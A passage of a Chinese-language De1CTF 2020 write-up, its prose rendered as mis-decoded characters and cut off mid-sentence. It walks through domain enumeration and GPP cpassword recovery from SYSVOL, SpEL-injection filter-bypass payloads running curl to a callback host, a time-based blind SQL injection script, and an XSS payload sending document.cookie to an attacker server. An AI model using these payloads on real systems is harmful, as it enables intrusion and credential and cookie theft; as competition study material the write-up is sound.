rel="noopener">åŸŸæ¸—é€æ€»ç»“</a></p><blockquote><p>åŸŸï¼ˆDomainï¼‰æ˜¯ç›¸å¯¹å·¥ä½œç»„ï¼ˆWorkgroupï¼‰çš„æ¦‚å¿µï¼Œå½¢è±¡çš„è¯´ï¼ŒåŸŸå°±åƒä¸­å¤®é›†æƒï¼Œç”±ä¸€å°æˆ–æ•°å°åŸŸæ§åˆ¶å™¨ï¼ˆDomain Controllerï¼‰ç®¡ç†åŸŸå†…çš„å…¶ä»–è®¡ç®—æœº</p></blockquote><p>æ‰€ä»¥åŸŸæ¸—é€çš„æ ¸å¿ƒæ˜¯é€šè¿‡å¯æ§çš„åŸŸç”¨æˆ·ï¼Œæ”¶é›†å…¶ä¸­çš„å¯ç”¨ä¿¡æ¯ï¼Œè¿›ä¸€æ­¥åˆ©ç”¨å…¶ä»–æ¼æ´å‘å±•æ›´å¤šåŸŸç”¨æˆ·ã€‚æœ€åèƒ½æ‹¿åˆ°ç®¡ç†å‘˜çš„å“ˆå¸Œï¼ŒåŸºæœ¬å°±ç®—æ¸—é€å®Œæ•´äº†ã€‚</p><p>ipconfig /allå¯ä»¥ç¡®è®¤å¤„äºåŸŸç®¡ç†æ¨¡å¼ä¸­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Public&gt; net user &#x2F;domain</span><br><span class="line">net user &#x2F;domain</span><br><span class="line">The request will be processed at a domain controller for domain De1CTF2020.lab.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User accounts for \\dc.De1CTF2020.lab</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            De1CTF1                  de1ta                    </span><br><span class="line">Guest                    HintZip_Pass             krbtgt                   </span><br><span class="line">web                      </span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢åŸŸç”¨æˆ·æ—¶ä¹Ÿèƒ½å¾—åˆ°è·ŸwinPEASä¸€æ ·çš„å…³äºåŸŸç”¨æˆ·çš„ä¿¡æ¯ã€‚<br>å°è¯•net use</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; net use</span><br><span class="line">net use</span><br><span class="line">New connections will be remembered.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Status       Local     Remote                    Network</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">OK                     \\192.168.0.12\Hint       Microsoft Windows Network</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p>å‘ç°<code>\\192.168.0.12\Hint</code>ã€‚ä¸”ç”±äºæˆ‘ä»¬åˆšåˆšæ˜¯å»ºç«‹çš„IPCç©ºé“¾æ¥ã€‚å› æ­¤å¯ä»¥æ— éœ€ç”¨æˆ·åå¯†ç è®¿é—®å®ƒã€‚(ä¸è¿‡æˆ‘åæ¥å†çœ‹æ—¶å‘ç°è¿™ä¸ªåœ°å€æ²¡äº†)<br><code>net view\\192.168.0.12\</code>ä¹Ÿèƒ½å‘ç°æœ‰Hint,SYSVOL,NETLOGINå‡ ä¸ªç›®å½•</p><p>ç›´æ¥pushd<code>\\192.168.0.12\Hint</code>è¿›å…¥filesystem.å‘ç°äº†ä¸€ä¸ªflag1_and_flag2hint.zip</p><p>åŸºäºæˆ‘ä»¬ç©çš„æ˜¯å¤šäººæ¸—é€ã€‚æ‰€ä»¥æœ€å¥½æŠŠå®ƒcopyåˆ°è‡ªå·±ç§å¯†çš„ä½ç½®ã€‚æˆ–è€…æŠŠå®ƒä»¥å…¶ä»–æ–‡ä»¶æ ¼å¼ä¿å­˜ä¸‹æ¥ã€‚(å› ä¸ºæˆ‘åœ¨æ€è€ƒå¦‚ä½•æŠŠå®ƒæ‹¿ä¸‹æ¥æ—¶åˆšå¥½åœ¨èšå‰‘çš„shellé‡Œå‘ç°åˆ«äººçš„zipæ–‡ä»¶2333)<br>ç›´æ¥ä¸‹å¥½åˆ«äººçš„zipå,ç°åœ¨è¦ä¸€ä¸ªå¯†ç </p><p>è¿™é‡Œå°±ä½“ç°å‡ºä¿¡æ¯æ”¶é›†çš„é‡è¦æ€§äº†ã€‚å› ä¸ºæˆ‘ä»¬ä¹‹å‰å‘ç°å¯ä»¥ç”¨çš„æ–‡ä»¶å¤¹é™¤äº†Hintè¿˜æœ‰SYSVOL.æ‰€ä»¥æˆ‘é€‰æ‹©ç™¾åº¦<code>åŸŸæ¸—é€ SYSVOL</code><br>å¾—åˆ°è¿™ç¯‡æ–‡ç« <a href="https://xz.aliyun.com/t/1653/" target="_blank" rel="noopener">åŸŸæ¸—é€â€”â€”åˆ©ç”¨SYSVOLè¿˜åŸç»„ç­–ç•¥ä¸­ä¿å­˜çš„å¯†ç </a><br>åœ¨åŸŸä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªé»˜è®¤çš„å…±äº«è·¯å¾„<code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</code></p><blockquote><p>åŸŸç®¡ç†å‘˜åœ¨ä½¿ç”¨ç»„ç­–ç•¥æ‰¹é‡ç®¡ç†åŸŸå†…ä¸»æœºæ—¶ï¼Œå¦‚æœé…ç½®ç»„ç­–ç•¥çš„è¿‡ç¨‹ä¸­éœ€è¦å¡«å…¥å¯†ç ï¼Œé‚£ä¹ˆè¯¥å¯†ç ä¼šè¢«ä¿å­˜åˆ°å…±äº«æ–‡ä»¶å¤¹\SYSVOLä¸‹ï¼Œé»˜è®¤æ‰€æœ‰åŸŸå†…ç”¨æˆ·å¯è®¿é—®ï¼Œè™½ç„¶å¯†ç é€šè¿‡AES 256è¿›è¡ŒåŠ å¯†ï¼Œå¯†é’¥æ˜¯å…¬å¼€åœ¨å¾®è½¯å®˜ç½‘çš„ã€‚</p></blockquote><p>å‚è€ƒè¿™ç¯‡æ–‡ç« <a href="https://www.cnblogs.com/zpchcbd/p/11703687.html" target="_blank" rel="noopener">åŸŸæ¸—é€ï¼šGPP(Group Policy Preferences)æ¼æ´</a><br>å¯ä»¥ä½¿ç”¨<code>dir /s /a \\åŸŸæ§IP\SYSVOL\*.xml</code>æ¥å°è¯•åˆ—å‡ºå­˜åœ¨çš„xml<br><code>dir /s /a \\192.168.0.12\SYSVOL\*.xml</code><br>å¾—åˆ°å®Œæ•´è·¯å¾„åè¯»å–ã€‚è¿™é‡Œè¯•äº†ä¸‹typeä¸è¡Œï¼Œgcä¸è¡Œã€‚ç”¨moreæˆäº†<br><code>more \\192.168.0.12\SYSVOL\De1CTF2020.lab\Policies\{B1248E1E-B97D-4C41-8EA4-1F2600F9264B}\Machine\Preferences\Groups\Groups.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Groups</span> <span class="attr">clsid</span>=<span class="string">"&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;"</span>&gt;</span><span class="tag">&lt;<span class="name">User</span> <span class="attr">clsid</span>=<span class="string">"&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;"</span> <span class="attr">name</span>=<span class="string">"HintZip_Pass"</span> <span class="attr">image</span>=<span class="string">"2"</span> <span class="attr">changed</span>=<span class="string">"2020-04-15 14:43:23"</span> <span class="attr">uid</span>=<span class="string">"&#123;D33537C1-0BDB-44B7-8628-A6030A298430&#125;"</span>&gt;</span><span class="tag">&lt;<span class="name">Properties</span> <span class="attr">action</span>=<span class="string">"U"</span> <span class="attr">newName</span>=<span class="string">""</span> <span class="attr">fullName</span>=<span class="string">""</span> <span class="attr">description</span>=<span class="string">""</span> <span class="attr">cpassword</span>=<span class="string">"uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08"</span> <span class="attr">changeLogon</span>=<span class="string">"1"</span> <span class="attr">noChange</span>=<span class="string">"0"</span> <span class="attr">neverExpires</span>=<span class="string">"0"</span> <span class="attr">acctDisabled</span>=<span class="string">"0"</span> <span class="attr">userName</span>=<span class="string">"HintZip_Pass"</span>/&gt;</span><span class="tag">&lt;/<span class="name">User</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Groups</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªcpasswordæ°å¥½æ˜¯å±äºHintZip_Passçš„ã€‚é‚£ä¹ˆæ ¹æ®ä¸Šæ–‡ï¼Œç”±äºç§é’¥æš´éœ²ã€‚åªè¦çŸ¥é“å…¬é’¥cpasswordå³å¯ç ´è§£ã€‚</p><p>kaliæœ‰ç°æˆçš„gpp-decrypt ç›´æ¥ç”¨<code>gpp-decrypt uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08</code>å°±æˆã€‚<br>å¾—åˆ°å¯†ç åè§£å‡ºzipæ–‡ä»¶<br><img src="/2020/05/04/De1CTF2020writeup/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™é¢˜åšå®Œååç»­æç¤ºçœ‹éƒ½ä¸æƒ³çœ‹äº†.çœŸçš„æ˜¯éš¾.ä¸è¿‡æ”¶è·ç‰¹æŒºå¤šçš„ã€‚<br>(ä»¥åæˆ‘ä¸€å®šå¥½å¥½å­¦æ¸—é€.jpg)</p><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>æ˜¨å¤©æ¯”èµ›æ—¶æ²¡åšå‡ºæ¥â€¦ç¬¬äºŒå¤©zjyå¸ˆå‚…æ„é€ å‡ºäº†payloadã€‚æ‰æ„Ÿæ…¨è‡ªå·±è¿˜æ˜¯å¤ªèœäº†ã€‚</p><p>æŠ“åŒ…å°±èƒ½å¾—åˆ°<code>spel/calc?calc=</code>çš„è·¯ç”±<br>æç¤ºçš„è¿™ä¹ˆæ˜æ˜¾ï¼Œåªèƒ½æ˜¯spELçš„è¡¨è¾¾å¼æ³¨å…¥äº†ã€‚<br>ä¸è¿‡ç®€å•FUZZä¸€ä¸‹ï¼Œå‘ç°æœä¸å…¶ç„¶æœ‰wafã€‚<br>å¤§æ¦‚æœ‰è¿™äº›å…³é”®å­—å§ï¼Œ<br><code>#,getClass, T( ,java.lang, new ,String,</code><br>æƒ³è¦ç›´æ¥RCEå½“ç„¶ä¸è¡Œã€‚æ‰€ä»¥å¾—æ„é€ </p><p>ç¬¬ä¸€æƒ³æ³•æ˜¯æŸ¥èµ„æ–™ï¼Œæ‰¾åˆ°ä¸å°‘å¸ˆå‚…åšcode-breakingæ—¶ç”¨åå°„è¿›è¡ŒspEL-RCEçš„payload<br>åŸæœ¬æ˜¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure><p>é€šè¿‡åå°„ï¼Œæˆ‘ä»¬å°±èƒ½å·§å¦™åˆ©ç”¨åå°„æ„é€ å‡ºç±»ä¸æ–¹æ³•ã€‚ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.class.getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("exec",String.class).invoke(String.class.getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(String.class.getClass().forName("java.l"+"ang.Ru"+"ntime")),"curl xxxx");</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡ŒString,getClassæ²¡äº†ã€‚ä¸è¿‡ä¹Ÿæœ‰æ–¹æ³•ç»•è¿‡<br>ä½¿ç”¨<code>&#39;&#39;[&#39;class&#39;]</code>æ•°ç»„ç›´æ¥ç»•<br>è¿™æ˜¯å‚è€ƒSEAM2.3.1çš„ä¸€ä¸ªååºåŒ–payloadçš„æ”¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>[<span class="string">'class'</span>].forName(<span class="string">'java.lang.Runtime'</span>).getDeclaredMethods()[<span class="number">15</span>].invoke(<span class="string">''</span>[<span class="string">'class'</span>].forName(<span class="string">'java.lang.Runtime'</span>).getDeclaredMethods()[<span class="number">7</span>].invoke(<span class="keyword">null</span>),<span class="string">'curl 172.17.0.1:9898'</span>)</span><br></pre></td></tr></table></figure><p>ç„¶è€Œpayloadæ‰“äº†ä¸€å‘å‘ç°æŠ¥é”™ã€‚ç„¶åå°±æ— è¯­äº†ã€‚è¿™æ—¶æƒ³èµ·æ¥,æŠ“åŒ…æ—¶å‘ç°headeré‡Œæœ‰openrasp,ä¼°è®¡æ˜¯ç›´æ¥ä»åº•å±‚æŠŠruntimeä¹‹ç±»çš„ç»™hookæ‰äº†ã€‚</p><p>ç„¶åéƒå¸ˆå‚…è¯´ä¸ç”¨æ‰§è¡Œå‘½ä»¤ä¹Ÿèƒ½è¯»ã€‚ä»”ç»†æƒ³æŒºæœ‰é“ç†çš„,ä¸ç„¶æ²¡å¿…è¦ç›´æ¥å‘Šè¯‰æˆ‘ä»¬flagåœ¨æ ¹ç›®å½•<br>ä½†æ˜¯ç¡®å®javaå¤ªèœäº†â€¦ä¸‹é¢æ˜¯é˜Ÿå‹æ•™æˆ‘çš„æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New java.io.BufferedReader(New java.io.FileReader(<span class="string">"/flag"</span>)).readLine()</span><br></pre></td></tr></table></figure><p>åŸæ¥åœ¨spELé‡Œæ˜¯ä¸åŒºåˆ†å…³é”®å­—å¤§å°å†™çš„â€¦é‚£ç›´æ¥ç”¨javaèƒ½è¯»æ–‡ä»¶çš„ç±»æ¥å°±è¡Œäº†â€¦<br><a href="https://juejin.im/post/5cdc21626fb9a0320c5ad583" target="_blank" rel="noopener">Java è¯»æ–‡ä»¶çš„5ç§æ–¹å¼</a><br>åŒç†ä¹Ÿå¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New java.util.Scanner(New java.io.File(<span class="string">"/flag"</span>)).nextLine()</span><br></pre></td></tr></table></figure><p><img src="/2020/05/04/De1CTF2020writeup/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>javaæ˜¯çœŸçš„è¦å¥½å¥½ç ”ç©¶ä¸‹äº†</p><p>ps:åœ¨æ¨é€é‡Œçœ‹åˆ°ä¸€ç¯‡æ–‡ç« æ°å¥½æåˆ°äº†De1è¿™é¢˜ã€‚æ‰å‘ç°dalaoç›´æ¥bypass openraspè¿›è¡ŒRCEäº†â€¦<br>å‚è€ƒ:<a href="https://landgrey.me/blog/15/" target="_blank" rel="noopener">bypass openrasp SpEL RCE çš„è¿‡ç¨‹åŠæ€è€ƒ</a><br>åŸæ¥æ·±æŒ–spELçš„åº•å±‚è§£ææºç ï¼Œå¯å‘ç°ç©ºå­—ç¬¦èƒ½ç›´æ¥bypass.æ‰€ä»¥ï¼Œåˆå¯ä»¥äº§ç”Ÿå®Œå…¨ä¸ä¾èµ–newçš„å®ä¾‹åŒ–æ–¹æ³•.ç›´æ¥ç©ºå­—ç¬¦æ’è¿›è¢«è¿‡æ»¤çš„<code>T(</code>ä¸­å³å¯<br><img src="/2020/05/04/De1CTF2020writeup/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ç”šè‡³è¿›ä¸€æ­¥ï¼Œè¿˜èƒ½é€šè¿‡ååºåˆ—åŒ–çš„æ€æƒ³,ä¸æ˜¾ç¤ºçš„åŠ è½½æ¶æ„ç±»,è¾¾æˆRCEã€‚<br>orzåŸæ¥javaçš„å§¿åŠ¿è¿™ä¹ˆå¤šçš„ä¹ˆâ€¦</p><h2 id="mixture"><a href="#mixture" class="headerlink" title="mixture"></a>mixture</h2><p>å¯ä»¥ä»»æ„ç™»å½•<br>member.phpæ³¨é‡Šä¸­æœ‰ orderby<br>æµ‹äº†ä¸‹å‘ç°åº”è¯¥æ˜¯order by åçš„è¯­å¥<br>å¼€å§‹ä»¥ä¸ºåªèƒ½æ¥limit<br>é‚£æœ‰ä¸”ä»…æœ‰<code>procedure analyse</code>ä¸€ç§æ–¹æ³•<br>ä½†æŠ¥é”™å‡½æ•°éƒ½æ²¡äº†ã€‚å»¶æ—¶å»¶ä¸äº†ã€‚ç‰ˆæœ¬é—®é¢˜åªèƒ½ç”¨5.6ä»¥ä¸‹çš„å‡½æ•°ã€‚çœŸå¿ƒæ²¡æ‰‹æ®µäº†<br>æˆ‘æœ‰ç½ªï¼Œè¿™ç§éš¾åº¦çš„sqlè¢«å¡ä½ã€‚è¯¥æ‰“ã€‚</p><p>ç›´æ¥and åˆ†æµæˆ‘å±…ç„¶ä¼šå¿˜äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://134.175.185.244/member.php?orderby='</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    a=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> str1 <span class="keyword">in</span> <span class="string">"qwdfkjurlasetghnioyzxcvbpmQWDFKJURLASETGHNIOYZXCVBPM1234567890,"</span>:</span><br><span class="line">        payload = <span class="string">"and case when (substr((select password from member),"</span>+str(i)+<span class="string">",1)='"</span>+str1+<span class="string">"') then (benchmark(500000,sha(1))) else 1 end"</span></span><br><span class="line">        payload = urllib.parse.quote(payload)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url + payload, timeout=<span class="number">2.5</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag+=str1</span><br><span class="line">            print(flag)</span><br><span class="line">            a=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>æ±‚å¾—å¯†ç è§£å‡ºæ¥å¾—åˆ°<br>goodlucktoyou</p><p>è¿›å»åä¸€å¼€å§‹å‘ç°æœ‰ä¸€ä¸ªselect.phpä»»æ„è¯»æ–‡ä»¶çš„åŠŸèƒ½ä¸admin.phpç»™å‡ºçš„phpinfo,ä½†æ˜¯è¯»å®Œæºç åå‘ç°å±…ç„¶ä½¿ç”¨äº†Mincludeè¿™ä¸ªå‡½æ•°æ¥åŒ…å«ã€‚phpinfoé‡Œä¹Ÿèƒ½çœ‹åˆ°è¿™ä¸ªå‡½æ•°çš„soæ–‡ä»¶â€¦.æ‰€ä»¥è¿™é¢˜çœŸé¢ç›®æ˜¯<del>WEB</del>-PWN,åº”è¯¥æ˜¯é€šè¿‡è°ƒè¿™ä¸ªsoæ¥æº¢å‡ºæ‰§è¡Œæ ¹ç›®å½•çš„readflagâ€¦</p><p>ç„¶è€Œæ¯”èµ›å·²ç»å¿«ç»“æŸäº†ï¼Œç­‰äºç™½ç»™ã€‚</p><h2 id="AnimalCrossing"><a href="#AnimalCrossing" class="headerlink" title="AnimalCrossing"></a>AnimalCrossing</h2><p>è¿™é¢˜ç­‰wpå§â€¦è€å®è¯´ä¸æƒ³å¤ç°äº†ã€‚å› ä¸ºé¢˜ç›®å¾—åˆ°flagé™¤äº†è¦å¼¹adminçš„cookie,è¿˜è¦ä»adminç•Œé¢çš„å›¾ç‰‡è·å–ä¿¡æ¯â€¦<br>æ²¡è§è¿‡è¿™ä¹ˆç£¨äººçš„xss.</p><p>5.18å¤ç°:</p><p>ä»Šå¤©æ•´ç†ä»“åº“æ—¶å¶ç„¶å‘ç°De1CTFè¿™ä¸ªé¢˜æ˜¯æœ‰dockerç¯å¢ƒçš„ã€‚äºæ˜¯å°±èµ·äº†ä¸ªç¯å¢ƒå°è¯•å¤ç°ä¸‹ã€‚å‘ç°å­¦åˆ°äº†ä¸å°‘å§¿åŠ¿ã€‚</p><p>é¦–å…ˆç¬¬ä¸€æ­¥è‡ªç„¶æ˜¯åˆ©ç”¨é‚£ä¸ªå¯èƒ½è¾¾æˆxssçš„ç‚¹äº†ã€‚æœ¬é¢˜æ˜¯åœ¨è¿™ä¸ªurlä¸­çš„dataä½ç½®<br><img src="/2020/05/04/De1CTF2020writeup/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä½†æ˜¯æ­¤å¤„self-xssçš„è¾¾æˆéƒ½ååˆ†å›°éš¾ã€‚å› ä¸ºä¸€æ–¹é¢å­˜åœ¨wafè¿‡æ»¤æ‰å­—ç¬¦(è¿™é‡Œå¦‚æœparseå¤±è´¥å›æ˜¾ä¹Ÿæ˜¯æŒ‰é‡åˆ°wafåˆ¤æ–­çš„,æ‰€ä»¥è¦æ³¨æ„è¯­æ³•çš„è§„èŒƒ)ã€‚åŒæ—¶è¿˜æœ‰ä¸ªCSP.<br><code>default-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;;object-src &#39;none&#39;;</code><br>å½“ç„¶è¿™ä¸ªCSPå¾ˆå¥½ç»•ã€‚ä½¿ç”¨locationè¿™ä¸€ç±»å‹çš„è·³è½¬å°±å¯ä»¥äº†ã€‚éš¾ç‚¹åœ¨äºç»•wafè¾¾æˆåé¢çš„jsä»£ç æ‰§è¡Œã€‚</p><p>çœ‹åˆ°skyå¸ˆå‚…çš„wpåæ‰æç„¶å¤§æ‚Ÿã€‚(è†œä¸€å¶é£˜é›¶å¸ˆå‚…,è‡ªå·±å¾ˆå¤šçŸ¥è¯†éƒ½æ˜¯ä»ä»–çš„æ–‡ç« é‚£å­¦æ¥çš„).åŸæ¥æ˜¯å¯ä»¥åˆ©ç”¨jsçš„ä¸€ä¸ªtrick,è€Œä¸”è‡ªå·±æ›¾ç»å¤§æ¦‚æ¥è§¦è¿‡ã€‚</p><p>å…ˆè§£é‡Šä¸‹è¿™é‡Œçš„xssæ‰§è¡Œ<br><img src="/2020/05/04/De1CTF2020writeup/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æˆ‘ä»¬çš„æ•°æ®å¯ä»¥ç›´æ¥é€šè¿‡urlä¸­dataå‚æ•°æ‹¼æ¥è¿›è¿™é‡Œçš„jsä»£ç ã€‚é¦–å…ˆè‡ªç„¶ä½¿ç”¨<code>1&#39;//</code>ä¿è¯ä»£ç è¯­æ³•çš„åˆæ³•æ€§ã€‚ä¹‹åè€ƒè™‘çš„å°±æ˜¯,æ€ä¹ˆæ ·åœ¨å•å¼•å·è·Ÿæ³¨é‡Šç¬¦ä¸­é—´è¿™éƒ¨åˆ†ä½¿ç”¨jsä»£ç ç»•è¿‡wafè¿›è¡Œxssã€‚<br>äºæ˜¯è¿™é‡Œå°±è¦æåˆ°jsçš„ä¸€ä¸ªtrickäº†ã€‚å…ˆè§£é‡Šä¸‹skyå¸ˆå‚…çš„payloadã€‚<br><img src="/2020/05/04/De1CTF2020writeup/8.PNG" class="lazyload" data-srcset="8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å¯¹äºjsä¸­ä¸€ä¸ªå¯¹è±¡è€Œè¨€,å…¶<code>valueOf()</code>æ–¹æ³•ä¼šè¿”å›å¯¹è±¡æœ¬èº«ã€‚è€Œå½“æˆ‘ä»¬å°†å¯¹è±¡ä¸äºŒå…ƒè¿ç®—ç¬¦è¿›è¡Œæ“ä½œæ—¶,å°†ä¼šè°ƒç”¨valueofæ–¹æ³•ã€‚<br>é‚£ä¹ˆè¿™æ ·å°±ç®€å•äº†,åªè¦èƒ½æ§åˆ¶<code>valueOf()</code>æ–¹æ³•è¿”å›å€¼,å°±èƒ½æ‰§è¡Œä»»æ„jsä»£ç ã€‚<br>é‚£ä¹ˆæ­¤å¤„payloadå°±å¯ä»¥æ„é€ æˆ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+&#123;"valueOf":new "".construcor.constructor(atob('</span>base64xsspayload<span class="string">'))&#125;+1//</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>constructor</code>è·å–åˆ°åŒ¿åå‡½æ•°è¿™ä¸ªåœ¨nodejsé‡Œå·²ç»éå¸¸ç†Ÿæ‚‰äº†ã€‚åŒæ—¶è¿™é‡Œ<code>+1</code>å°±å¯ä»¥ç›´æ¥è§¦å‘<code>valueOf</code>.æœ€åæˆ‘ä»¬ä¸ºäº†ç»•è¿‡wafä½¿ç”¨å§base64ç»•è¿‡ã€‚</p><p>å½“ç„¶ä½¿ç”¨å…¶ä»–æ–¹æ³•éƒ½å¯ä»¥ã€‚æˆ‘çœ‹è§æ¦œä¸€çš„mslcpayloadå¤§æ¦‚ä¹Ÿæ˜¯ç”¨äºŒå…ƒè¿ç®—ç¬¦åŠ ä¸Šbase64paylaodè¾¾æˆçš„ã€‚åªä¸è¿‡ç”¨çš„æ˜¯jsä¼ªåè®®ã€‚å½¢å¼ä¸Šç®€å•äº†è®¸å¤š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;javascript:&#123;window.location.href&#x3D;&quot;vpsip&#x2F;?&quot;+document.cookie&#125;</span><br><span class="line"></span><br><span class="line">data&#x3D;1&#39;%2bopen(atob(&#39;base64encodepaylaod&#39;))&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>åé¢æ‰“ç»™adminæ”¶flag<br>å› 